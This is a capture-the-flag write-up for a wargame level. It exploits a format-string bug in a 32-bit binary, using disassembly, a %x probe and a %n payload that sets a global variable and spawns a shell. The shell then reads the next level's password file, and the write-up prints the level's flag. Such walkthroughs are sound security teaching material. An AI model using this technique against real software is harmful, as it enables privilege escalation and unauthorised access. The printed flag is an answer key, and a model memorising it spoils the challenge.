# Level 3

## Connect to the virtual machine with SSH

Use the flag from `level2` as the `level3` password:

```bash
ssh level3@127.0.0.1 -p 2223
```

## Copy the binary to the host machine

From the root of this repository on the host:

```bash
scp -P 2223 level3@127.0.0.1:/home/user/level3/level3 ./level3/
```

The extracted binary is saved as `level3/level3`.

## Copy the GDB dump to the host

Inside the VM, connected as `level3`, open the binary with GDB:

```bash
gdb ./level3
```

Then enter:

```gdb
set disassembly-flavor intel
set pagination off
set logging file /tmp/level3_main_dump_gdb
set logging overwrite on
set logging on
disas main
disas v
set logging off
quit
```

Then copy the dump back from the host:

```bash
scp -P 2223 level3@127.0.0.1:/tmp/level3_main_dump_gdb ./level3/
```

Since the binary is already on the host, the same dump can also be generated
locally:

```bash
gdb -q -batch \
  -ex "set disassembly-flavor intel" \
  -ex "disassemble main" \
  -ex "disassemble v" \
  ./level3/level3 > ./level3/level3_main_dump_gdb
```

## Analyze the GDB dump

`main` only calls `v`:

```asm
0x0804851a <+0>:  push   ebp
0x0804851b <+1>:  mov    ebp,esp
0x0804851d <+3>:  and    esp,0xfffffff0
0x08048520 <+6>:  call   0x80484a4 <v>
0x08048525 <+11>: leave
0x08048526 <+12>: ret
```

The vulnerability is in `v`:

```asm
0x080484be <+26>: lea    eax,[ebp-0x208]
0x080484c4 <+32>: mov    DWORD PTR [esp],eax
0x080484c7 <+35>: call   0x80483a0 <fgets@plt>
0x080484cc <+40>: lea    eax,[ebp-0x208]
0x080484d2 <+46>: mov    DWORD PTR [esp],eax
0x080484d5 <+49>: call   0x8048390 <printf@plt>
```

`fgets` limits the input size, so this is not a stack overflow. The bug is that
the input buffer is passed directly to `printf` as the format string.

After `printf`, the program checks a global variable:

```asm
0x080484da <+54>: mov    eax,ds:0x804988c
0x080484df <+59>: cmp    eax,0x40
0x080484e2 <+62>: jne    0x8048518 <v+116>
0x0804850c <+104>: mov   DWORD PTR [esp],0x804860d
0x08048513 <+111>: call  0x80483c0 <system@plt>
```

The global variable is `m`:

```bash
objdump -t level3/level3 | grep ' m$'
```

Result:

```text
0804988c g     O .bss  00000004              m
```

So the target is:

```text
m = 0x0804988c
```

The program runs `system("/bin/sh")` only if `m == 0x40`, which is decimal `64`.

## Find the format-string argument index

Send a marker followed by `%x` probes:

```bash
python -c 'print "AAAA" + ".%x" * 12' | /home/user/level3/level3
```

Output:

```text
AAAA.200.b7fd1ac0.b7ff37d0.41414141.2e78252e...
```

`41414141` is `AAAA` in hexadecimal. It appears as the 4th printed argument, so
the start of our input is reachable with `%4$...`.

## Build the write

We want `%n` to write `64` to `m`.

Place the address of `m` at the start of the input:

```text
0x0804988c -> \x8c\x98\x04\x08
```

Those 4 raw bytes are printed before `%n`, so `printf` has already printed 4
characters. We need `64` total:

```text
64 - 4 = 60
```

So the format part is:

```text
%60d%4$n
```

`%60d` prints enough padding to bring the printed character count to `64`.
`%4$n` writes that count into the address stored at the 4th argument, which is
our `m` address.

## Exploitation

Run this in the VM:

```bash
(python -c 'print "\x8c\x98\x04\x08" + "%60d%4$n"'; cat) | /home/user/level3/level3
```

The program prints:

```text
Wait what?!
```

The `cat` keeps stdin open for the shell started by `system("/bin/sh")`.

Check the effective identity:

```bash
whoami
```

Result:

```text
level4
```

Read the next password:

```bash
cat /home/user/level4/.pass
```

## Flag

```text
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
